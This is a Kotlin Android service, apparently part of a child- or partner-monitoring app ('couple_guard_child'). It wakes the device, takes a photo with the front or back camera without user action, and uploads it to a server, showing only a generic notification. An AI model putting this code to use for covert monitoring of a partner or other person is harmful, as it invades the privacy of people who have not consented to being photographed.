package com.example.couple_guard_child.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.example.couple_guard_child.utils.ApiClient
import java.io.File
import java.io.FileOutputStream

/**
 * ✅ FIXED CAMERA SERVICE
 * 
 * Improvements:
 * 1. Wake lock untuk prevent sleep saat capture
 * 2. Better foreground notification (IMPORTANCE_DEFAULT instead of LOW)
 * 3. Retry mechanism untuk camera open failures
 * 4. Proper error handling untuk Android 14+
 * 5. Fallback strateg

y
 */
class CameraBackgroundService : Service() {
    companion object {
        private const val TAG = "CameraBackgroundService"
        private const val NOTIFICATION_ID = 2001
        private const val CHANNEL_ID = "camera_capture_channel"
        private const val MAX_RETRY_ATTEMPTS = 3
        private const val RETRY_DELAY_MS = 2000L

        fun startCapture(context: Context, useFrontCamera: Boolean) {
            val intent = Intent(context, CameraBackgroundService::class.java)
            intent.putExtra("use_front_camera", useFrontCamera)
            intent.putExtra("retry_count", 0)
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }

    private var cameraManager: CameraManager? = null
    private var cameraDevice: CameraDevice? = null
    private var imageReader: ImageReader? = null
    private val handler = Handler(Looper.getMainLooper())
    private var useFrontCamera: Boolean = true
    private var captureAttempted = false
    private var retryCount = 0
    private var wakeLock: PowerManager.WakeLock? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "========================================")
        Log.d(TAG, "📸 CameraBackgroundService CREATED")
        createNotificationChannel()
        
        // ✅ Acquire wake lock to prevent device sleep
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "CameraService::WakeLock"
        )
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "========================================")
        Log.d(TAG, "📸 CAMERA SERVICE START")
        
        retryCount = intent?.getIntExtra("retry_count", 0) ?: 0
        Log.d(TAG, "Retry count: $retryCount")
        
        // ✅ STEP 1: Acquire wake lock FIRST
        try {
            wakeLock?.acquire(60 * 1000L) // 60 seconds max
            Log.d(TAG, "✅ Wake lock acquired")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to acquire wake lock", e)
        }

        // ✅ STEP 2: Start as foreground with PROPER notification
        try {
            val notification = createNotification("Preparing camera...", false)
            startForeground(NOTIFICATION_ID, notification)
            Log.d(TAG, "✅ Started as foreground service")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start foreground", e)
            releaseLockAndStop()
            return START_NOT_STICKY
        }

        useFrontCamera = intent?.getBooleanExtra("use_front_camera", true) ?: true
        Log.d(TAG, "Use front camera: $useFrontCamera")

        // ✅ STEP 3: Check permission
        if (checkSelfPermission(android.Manifest.permission.CAMERA) 
            != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "❌ No camera permission!")
            releaseLockAndStop()
            return START_NOT_STICKY
        }

        // ✅ STEP 4: Small delay to stabilize
        handler.postDelayed({
            if (!captureAttempted) {
                capturePhoto(useFrontCamera)
            }
        }, 500)

        return START_NOT_STICKY
    }

    private fun capturePhoto(useFront: Boolean) {
        captureAttempted = true
        
        try {
            Log.d(TAG, "Initializing camera manager...")
            cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            
            val cameraId = findCamera(useFront)
            if (cameraId == null) {
                Log.e(TAG, "❌ Camera not found")
                handleCaptureFailure()
                return
            }
            
            Log.d(TAG, "Camera ID: $cameraId")
            updateNotification("Opening camera...", false)

            // ✅ Use reasonable resolution (not too high)
            imageReader = ImageReader.newInstance(
                1280, 720,  
                android.graphics.ImageFormat.JPEG, 
                2
            )
            
            imageReader?.setOnImageAvailableListener({ reader ->
                Log.d(TAG, "📸 Image available from ImageReader")
                
                try {
                    val image = reader.acquireLatestImage()
                    if (image != null) {
                        saveAndSendImage(image)
                        image.close()
                    } else {
                        Log.e(TAG, "❌ Image is null")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Error in image callback", e)
                }
                
                closeCamera()
                releaseLockAndStop()
                
            }, handler)

            Log.d(TAG, "Opening camera device...")
            
            cameraManager?.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    Log.d(TAG, "✅ Camera opened successfully")
                    cameraDevice = camera
                    updateNotification("Taking picture...", false)
                    
                    // Small delay for camera stabilization
                    handler.postDelayed({
                        takePicture()
                    }, 300)
                }

                override fun onDisconnected(camera: CameraDevice) {
                    Log.w(TAG, "⚠️ Camera disconnected")
                    closeCamera()
                    handleCaptureFailure()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    val errorMsg = when(error) {
                        ERROR_CAMERA_IN_USE -> "Camera in use"
                        ERROR_MAX_CAMERAS_IN_USE -> "Max cameras in use"
                        ERROR_CAMERA_DISABLED -> "Camera disabled by policy"
                        ERROR_CAMERA_DEVICE -> "Camera device error"
                        ERROR_CAMERA_SERVICE -> "Camera service error"
                        else -> "Unknown error: $error"
                    }
                    Log.e(TAG, "❌ Camera error: $errorMsg")
                    closeCamera()
                    handleCaptureFailure()
                }
            }, handler)

        } catch (e: SecurityException) {
            Log.e(TAG, "❌ Security exception", e)
            handleCaptureFailure()
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to capture photo", e)
            e.printStackTrace()
            handleCaptureFailure()
        }
    }

    private fun handleCaptureFailure() {
        if (retryCount < MAX_RETRY_ATTEMPTS) {
            retryCount++
            Log.w(TAG, "⚠️ Capture failed, retry $retryCount/$MAX_RETRY_ATTEMPTS in ${RETRY_DELAY_MS}ms")
            
            updateNotification("Retrying... ($retryCount/$MAX_RETRY_ATTEMPTS)", false)
            
            handler.postDelayed({
                captureAttempted = false
                capturePhoto(useFrontCamera)
            }, RETRY_DELAY_MS)
        } else {
            Log.e(TAG, "❌ Max retries reached, giving up")
            releaseLockAndStop()
        }
    }

    private fun findCamera(useFront: Boolean): String? {
        try {
            val cameraIds = cameraManager?.cameraIdList ?: return null
            Log.d(TAG, "Found ${cameraIds.size} cameras")
            
            for (id in cameraIds) {
                val characteristics = cameraManager?.getCameraCharacteristics(id)
                val facing = characteristics?.get(CameraCharacteristics.LENS_FACING)
                
                val targetFacing = if (useFront) {
                    CameraCharacteristics.LENS_FACING_FRONT
                } else {
                    CameraCharacteristics.LENS_FACING_BACK
                }
                
                Log.d(TAG, "Camera $id facing: $facing (target: $targetFacing)")
                
                if (facing == targetFacing) {
                    return id
                }
            }
            
            Log.w(TAG, "Preferred camera not found, using first available")
            return cameraIds.firstOrNull()
            
        } catch (e: Exception) {
            Log.e(TAG, "Error finding camera", e)
            return null
        }
    }

    private fun takePicture() {
        try {
            Log.d(TAG, "Creating capture request...")
            
            val captureRequest = cameraDevice?.createCaptureRequest(
                CameraDevice.TEMPLATE_STILL_CAPTURE
            )
            
            if (captureRequest == null) {
                Log.e(TAG, "❌ Failed to create capture request")
                handleCaptureFailure()
                return
            }
            
            captureRequest.addTarget(imageReader!!.surface)
            
            // ✅ Optimal capture settings
            captureRequest.set(
                CaptureRequest.CONTROL_AF_MODE,
                CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE
            )
            captureRequest.set(
                CaptureRequest.CONTROL_AE_MODE,
                CaptureRequest.CONTROL_AE_MODE_ON
            )
            captureRequest.set(
                CaptureRequest.JPEG_QUALITY,
                85.toByte()
            )

            Log.d(TAG, "Creating capture session...")
            
            cameraDevice?.createCaptureSession(
                listOf(imageReader!!.surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        Log.d(TAG, "✅ Capture session configured")
                        
                        try {
                            session.capture(
                                captureRequest.build(),
                                object : CameraCaptureSession.CaptureCallback() {
                                    override fun onCaptureCompleted(
                                        session: CameraCaptureSession,
                                        request: CaptureRequest,
                                        result: TotalCaptureResult
                                    ) {
                                        Log.d(TAG, "✅ Capture completed")
                                        updateNotification("Processing image...", false)
                                    }

                                    override fun onCaptureFailed(
                                        session: CameraCaptureSession,
                                        request: CaptureRequest,
                                        failure: CaptureFailure
                                    ) {
                                        Log.e(TAG, "❌ Capture failed: ${failure.reason}")
                                        handleCaptureFailure()
                                    }
                                },
                                handler
                            )
                            Log.d(TAG, "✅ Capture triggered")
                        } catch (e: Exception) {
                            Log.e(TAG, "❌ Failed to trigger capture", e)
                            handleCaptureFailure()
                        }
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e(TAG, "❌ Capture session configure failed")
                        handleCaptureFailure()
                    }
                },
                handler
            )

        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to take picture", e)
            e.printStackTrace()
            handleCaptureFailure()
        }
    }

    private fun saveAndSendImage(image: android.media.Image) {
        try {
            Log.d(TAG, "Processing captured image...")
            updateNotification("Saving image...", false)
            
            val buffer = image.planes[0].buffer
            val bytes = ByteArray(buffer.remaining())
            buffer.get(bytes)

            val file = File(cacheDir, "capture_${System.currentTimeMillis()}.jpg")
            FileOutputStream(file).use { output ->
                output.write(bytes)
            }

            Log.d(TAG, "✅ Image saved: ${file.path}")
            Log.d(TAG, "Image size: ${file.length() / 1024} KB")

            val cameraType = if (useFrontCamera) "front" else "back"
            
            updateNotification("Uploading...", false)
            
            Thread {
                try {
                    val success = ApiClient.uploadCapturedPhoto(
                        applicationContext, 
                        file,
                        cameraType
                    )
                    
                    if (success) {
                        Log.d(TAG, "✅ Photo uploaded successfully")
                        updateNotification("Upload complete", true)
                    } else {
                        Log.e(TAG, "❌ Failed to upload photo")
                    }
                    
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Exception uploading photo", e)
                } finally {
                    try {
                        file.delete()
                        Log.d(TAG, "✅ Temp file deleted")
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to delete temp file", e)
                    }
                }
            }.start()

        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to save image", e)
            e.printStackTrace()
        }
    }

    private fun closeCamera() {
        try {
            cameraDevice?.close()
            cameraDevice = null
            
            imageReader?.close()
            imageReader = null
            
            Log.d(TAG, "✅ Camera resources closed")
        } catch (e: Exception) {
            Log.e(TAG, "Error closing camera", e)
        }
    }

    private fun releaseLockAndStop() {
        handler.postDelayed({
            try {
                closeCamera()
                
                // Release wake lock
                if (wakeLock?.isHeld == true) {
                    wakeLock?.release()
                    Log.d(TAG, "✅ Wake lock released")
                }
                
                stopForeground(true)
                stopSelf()
                Log.d(TAG, "✅ Service stopped")
                Log.d(TAG, "========================================")
            } catch (e: Exception) {
                Log.e(TAG, "Error stopping service", e)
            }
        }, 1000)
    }

    private fun updateNotification(message: String, autoCancel: Boolean) {
        try {
            val notification = createNotification(message, autoCancel)
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.notify(NOTIFICATION_ID, notification)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to update notification", e)
        }
    }

    private fun createNotification(message: String, autoCancel: Boolean): Notification {
        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Camera Capture")
            .setContentText(message)
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setPriority(NotificationCompat.PRIORITY_DEFAULT) // ✅ Changed from LOW
            .setAutoCancel(autoCancel)
            .setOngoing(!autoCancel)

        return builder.build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Camera Capture",
                NotificationManager.IMPORTANCE_DEFAULT // ✅ Changed from LOW
            ).apply {
                description = "Notifications for camera capture operations"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
            }
            
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager?.createNotificationChannel(channel)
            
            Log.d(TAG, "✅ Notification channel created")
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        super.onDestroy()
        closeCamera()
        
        if (wakeLock?.isHeld == true) {
            wakeLock?.release()
        }
        
        Log.d(TAG, "Service destroyed")
    }
}